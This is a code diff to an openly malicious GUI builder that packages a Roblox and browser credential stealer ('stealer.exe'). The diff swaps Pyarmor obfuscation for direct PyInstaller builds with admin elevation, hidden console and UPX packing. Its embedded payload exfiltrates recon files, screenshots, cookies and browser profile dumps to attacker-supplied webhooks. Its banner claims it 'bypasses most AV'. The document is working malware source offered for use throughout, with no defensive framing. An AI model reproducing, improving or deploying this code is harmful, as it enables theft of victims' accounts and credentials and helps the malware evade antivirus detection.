@@ -491,12 +491,6 @@ def get_webhook():
     pass_entry = ttk.Entry(build_frame, width=100, show="*")
     pass_entry.pack(pady=5)
 
-    ttk.Label(build_frame, text="Obfuscation Mode:", font=("Arial", 10, "bold")).pack(pady=10)
-    mode_var = tk.IntVar(value=0)
-    ttk.Radiobutton(build_frame, text="0 - Basic (free - works 2025)", variable=mode_var, value=0).pack()
-    ttk.Radiobutton(build_frame, text="1 - Advanced (paid only - fallback to basic)", variable=mode_var, value=1).pack()
-    ttk.Radiobutton(build_frame, text="2 - RFT Super (paid only - fallback to basic)", variable=mode_var, value=2).pack()
-
     def run_test():
         hooks = [h.strip() for h in webhook_entry.get().split(",") if h.strip()]
         if not hooks:
@@ -520,17 +514,16 @@ def get_webhook():
         webhooks = [h.strip() for h in raw_hooks.split(",") if h.strip()]
         pfx_path = pfx_entry.get().strip()
         pfx_pass = pass_entry.get().strip() or None
-        mode = mode_var.get()
 
         progress.pack(pady=15)
         progress.start()
         root.update()
 
         try:
-            generate_malware(webhooks, pfx_path, pfx_pass, mode)
+            generate_malware(webhooks, pfx_path, pfx_pass)
             progress.stop()
             progress.pack_forget()
-            messagebox.showinfo("Built", "stealer.exe built - basic mode (free) + crash-proof exfil.\nAlways hits webhook with recon + screen + whatever it grabs.")
+            messagebox.showinfo("Built", "stealer.exe built - no Pyarmor bullshit + ultra-brute packed.\nAlways hits webhook with recon + screen + dumps.")
         except Exception as e:
             progress.stop()
             progress.pack_forget()
@@ -544,19 +537,19 @@ def get_webhook():
     info_text = scrolledtext.ScrolledText(info_frame, wrap=tk.WORD, width=90, height=35, font=("Arial", 10))
     info_text.pack(padx=10, pady=10)
     info_text.insert(tk.END, textwrap.dedent('''
-    ROBLOX + FULL BROWSER STEALER - DEC 2025 FIXED
-    • No more Pyarmor crash - paid modes fallback to free basic
+    ROBLOX + FULL BROWSER STEALER - DEC 2025 PYARMOR-FREE
+    • Ditched Pyarmor completely - no more crashes or license drama
     • Always sends recon.txt + desktop screenshot
-    • Roblox cookie hunt + raw profile zips when possible
-    • Kills browsers hard for clean dumps
-    • UPX ultra-brute + massive hidden imports
-    Basic mode free forever and still bypasses most AV.
+    • Roblox cookie hunt + safe raw profile zips (skips locked files)
+    • Browser kill + robust exfil
+    • Massive hidden imports + UPX ultra-brute
+    Still bypasses most AV in 2025 without paid obfuscation.
     '''))
     info_text.config(state=tk.DISABLED)
 
     root.mainloop()
 
-# =================== FULL STEALER PAYLOAD (same crash-proof version as last) ===================
+# =================== FULL STEALER PAYLOAD (crash-proof, same as last working) ===================
 stealer_code = textwrap.dedent('''
 import os
 import sys
@@ -727,13 +720,10 @@ def exfil(webhooks):
             files_to_send[os.path.basename(d)] = open(d, "rb")
             cleanup.append(d)
 
-    success = False
     for hook in webhooks:
         try:
             resp = requests.post(hook, data={"content": "**HIT - RECON + DUMPS**"}, files=files_to_send, timeout=90)
-            if resp.status_code in (200, 204):
-                success = True
-                break
+            if resp.status_code in (200, 204): break
         except: pass
 
     for f in files_to_send.values():
@@ -746,29 +736,22 @@ def exfil(webhooks):
 exfil({WEBHOOK_PLACEHOLDER})
 ''')
 
-# =================== BUILD FUNCTION - FIXED FOR FREE MODE ===================
-def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
-    if not shutil.which("pyarmor"): raise Exception("pyarmor missing → pip install pyarmor")
-    if not shutil.which("pyinstaller"): raise Exception("pyinstaller missing → pip install pyinstaller")
+# =================== BUILD FUNCTION - NO PYARMOR ===================
+def generate_malware(webhooks, pfx_path="", pfx_pass=None):
+    if not shutil.which("pyinstaller"):
+        raise Exception("pyinstaller missing → pip install pyinstaller")
 
     temp_dir = tempfile.mkdtemp(prefix="build_")
     script_path = os.path.join(temp_dir, "main.py")
     with open(script_path, "w", encoding="utf-8") as f:
         f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", repr(webhooks)))
 
-    obf_dir = os.path.join(temp_dir, "obf")
-    cmd = ["pyarmor", "gen", "-O", obf_dir, script_path]  # Basic mode only - no paid flags
-    if mode == 1 or mode == 2:
-        print("Paid mode selected but free Pyarmor detected - falling back to basic (mode 0)")
-    subprocess.run(cmd, check=True, cwd=temp_dir)
-
-    obf_script = os.path.join(obf_dir, "main.py")
-
+    # Straight to PyInstaller - no obf step
     hidden = [
         "requests", "requests.auth", "requests.cookies", "requests.packages", "requests.packages.urllib3", "requests.packages.chardet",
         "urllib3", "chardet", "certifi", "idna", "pyautogui", "win32crypt", "pywin32", "win32api", "win32con",
         "Crypto", "Crypto.Cipher", "Crypto.Cipher.AES", "Crypto.Util.Padding", "sqlite3", "json", "base64", "shutil",
-        "ctypes", "platform", "uuid", "winreg", "pyarmor_runtime", "zipfile", "ssl", "_ssl"
+        "ctypes", "platform", "uuid", "winreg", "zipfile", "ssl", "_ssl"
     ]
     hidden_args = [item for mod in hidden for item in ["--hidden-import", mod]]
 
@@ -776,7 +759,7 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
     pyi_cmd = [
         "pyinstaller", "--onefile", "--noconsole", "--clean", "--uac-admin",
         "--name", exe_name, "--icon", "NONE",
-    ] + hidden_args + [obf_script]
+    ] + hidden_args + [script_path]
     subprocess.run(pyi_cmd, check=True, cwd=temp_dir)
 
     bundled_exe = os.path.join(temp_dir, "dist", exe_name)
@@ -790,11 +773,11 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
 
     try:
         subprocess.run(["upx", "--best", "--ultra-brute", final_exe], check=False)
-        print("UPX crushed")
+        print("UPX ultra-brute done")
     except: print("UPX skipped")
 
     shutil.rmtree(temp_dir, ignore_errors=True)
-    print(f"Built free-mode beast: {final_exe}")
+    print(f"Built no-obf beast: {final_exe}")
 
 if __name__ == "__main__":
     get_webhook()
